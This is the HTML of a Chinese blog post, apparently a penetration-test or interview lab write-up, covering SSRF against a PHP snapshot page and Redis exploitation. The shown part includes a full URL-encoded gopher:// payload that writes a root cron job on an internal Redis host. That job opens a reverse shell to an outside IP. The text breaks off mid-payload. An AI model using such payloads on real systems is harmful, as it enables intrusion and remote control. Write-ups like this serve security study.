@@ -1,0 +1,1639 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web1-1 读了一下源码\n1 file:///var/www/html/index.php 1 2 3 4 5 6 7 8 9 &lt;?php $url = $_POST[&#39;url&#39;]; if($url){ echo &#34;&lt;b&gt;&#34;.$url.&#34; 的快照如下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&#34;; echo &#34;&lt;pre&gt;&#34;; curl($url); echo &#34;&lt;/pre&gt;&#34;; } ?&gt; ">
+<title>某企业二面</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="某企业二面">
+<meta property='og:description' content=" web1-1 读了一下源码\n1 file:///var/www/html/index.php 1 2 3 4 5 6 7 8 9 &lt;?php $url = $_POST[&#39;url&#39;]; if($url){ echo &#34;&lt;b&gt;&#34;.$url.&#34; 的快照如下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&#34;; echo &#34;&lt;pre&gt;&#34;; curl($url); echo &#34;&lt;/pre&gt;&#34;; } ?&gt; ">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-11-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-16T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="某企业二面">
+<meta name="twitter:description" content=" web1-1 读了一下源码\n1 file:///var/www/html/index.php 1 2 3 4 5 6 7 8 9 &lt;?php $url = $_POST[&#39;url&#39;]; if($url){ echo &#34;&lt;b&gt;&#34;.$url.&#34; 的快照如下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&#34;; echo &#34;&lt;pre&gt;&#34;; curl($url); echo &#34;&lt;/pre&gt;&#34;; } ?&gt; ">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#web1-1">web1-1</a></li>
+    <li><a href="#web1-3">web1-3</a>
+      <ol>
+        <li><a href="#考点redis写定时任务反弹shell到vps">考点：redis写定时任务反弹shell到vps</a></li>
+      </ol>
+    </li>
+    <li><a href="#web1-2">web1-2</a>
+      <ol>
+        <li><a href="#考点-dict-协议连接到-redis-服务">考点： DICT 协议连接到 Redis 服务</a></li>
+      </ol>
+    </li>
+    <li><a href="#web2-1">web2-1</a>
+      <ol>
+        <li><a href="#考点weblogic-cve">考点：weblogic-cve</a></li>
+      </ol>
+    </li>
+    <li><a href="#web2-2">web2-2</a>
+      <ol>
+        <li><a href="#考点weblogic的cve_2016_0638_echo漏洞解weblogic的密文得数据库密码">考点：weblogic的CVE_2016_0638_ECHO漏洞+解weblogic的密文得数据库密码</a></li>
+      </ol>
+    </li>
+    <li><a href="#web2-3">web2-3</a></li>
+    <li><a href="#web3-1">web3-1</a></li>
+    <li><a href="#web3-2">web3-2</a>
+      <ol>
+        <li><a href="#考点heapdump泄露数据库信息">考点：heapdump泄露数据库信息</a></li>
+      </ol>
+    </li>
+    <li><a href="#web4-1">web4-1</a>
+      <ol>
+        <li><a href="#考点beecms登录页面文件上传rce">考点：beecms登录页面+文件上传rce</a></li>
+        <li><a href="#解法一sql报错注入">解法一：sql报错注入</a></li>
+        <li><a href="#解法二sql伪造登入">解法二：sql伪造登入</a></li>
+        <li><a href="#解法三变量覆盖绕过登入">解法三：变量覆盖绕过登入</a></li>
+      </ol>
+    </li>
+    <li><a href="#web5">web5</a>
+      <ol>
+        <li><a href="#考点tomcat后台爆破后台上传文件getshell">考点：tomcat后台爆破+后台上传文件getshell</a></li>
+      </ol>
+    </li>
+    <li><a href="#web6">web6</a>
+      <ol>
+        <li><a href="#考点liqunkit一把梭">考点：LiqunKit一把梭</a></li>
+      </ol>
+    </li>
+    <li><a href="#web7-1">web7-1</a>
+      <ol>
+        <li><a href="#考点shiro反序列化">考点：Shiro反序列化</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/">某企业二面</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-11-16</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h2 id="web1-1">web1-1
+</h2><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114190757471.png"
+	width="1010"
+	height="352"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114190757471_hu_bc73b8b0378d5957.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114190757471_hu_8dfe2d4db7a91535.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114190757471"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p>读了一下源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">file</span><span class="p">:</span><span class="o">///</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">      <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">          <span class="k">echo</span> <span class="s2">&#34;&lt;b&gt;&#34;</span><span class="o">.</span><span class="nv">$url</span><span class="o">.</span><span class="s2">&#34; 的快照如下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">curl</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191411849.png"
+	width="607"
+	height="147"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191411849_hu_1253c5d18fa043a7.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191411849_hu_33326e4d989066b5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114191411849"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="412"
+		data-flex-basis="991px"
+	
+></p>
+<h2 id="web1-3">web1-3
+</h2><h3 id="考点redis写定时任务反弹shell到vps">考点：redis写定时任务反弹shell到vps
+</h3><p>打<code>file:///etc/hosts</code>有</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191639668.png"
+	width="677"
+	height="289"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191639668_hu_709e33f9b9743d03.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114191639668_hu_69bc2ecf7a8c3487.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114191639668"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+></p>
+<p>然后爆破c断和端口</p>
+<img src="image-20251115132311644.png" alt="image-20251115132311644" style="zoom:50%;" />
+<p>发现172.18.240.7 redis未授权</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115134642905.png"
+	width="1582"
+	height="391"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115134642905_hu_2b403f3696f34e17.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115134642905_hu_72d94468fdee4068.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115134642905"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="971px"
+	
+></p>
+<p>那就打SSRF漏洞Redis反弹shell</p>
+<p><a class="link" href="https://www.cnblogs.com/yaoguyuan/p/18295089"  target="_blank" rel="noopener"
+    >实战篇——SSRF漏洞Redis反弹shell实战 - yaoguyuan - 博客园</a></p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151201268.png"
+	width="1662"
+	height="486"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151201268_hu_1c937110bde0edbb.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151201268_hu_7527e31568677a48.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115151201268"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="820px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">A1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">248</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aflushall</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">A3</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aset</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">241</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2469</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">/</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="n">bash</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">c</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">22</span><span class="n">sh</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">i</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">101.200</span><span class="o">.</span><span class="mf">39.193</span><span class="o">/</span><span class="mi">1234</span><span class="o">%</span><span class="mi">200</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">261</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">A4</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">246</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aconfig</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aset</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Adir</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2416</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">A4</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">246</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aconfig</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aset</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2410</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Adbfilename</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">244</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aroot</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">A1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">244</span><span 